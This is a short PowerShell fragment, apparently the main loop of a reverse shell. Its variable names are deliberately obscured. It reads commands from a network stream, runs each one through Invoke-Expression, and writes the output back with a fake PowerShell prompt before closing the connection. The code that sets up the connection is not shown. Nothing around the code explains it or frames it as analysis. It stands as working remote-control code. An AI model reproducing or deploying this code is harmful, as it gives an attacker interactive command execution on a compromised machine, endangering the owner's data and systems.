while(!($incoming = $crik.Read($bite, $nothing, $bite.Length)) -eq $nothing)
{;

        $info = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bite,$nothing, $incoming);
        $pass = (Invoke-Expression -Command ('. {' + $info + '} *>&1') | Out-String );
        $passthru = $pass + "PS " + (pwd).Path + "> ";
        $passbite = ([text.encoding]::ASCII).GetBytes($passthru);
        $crik.Write($passbite,$nothing,$passbite.Length);
        $crik.Flush()
};

 $puter.Close()
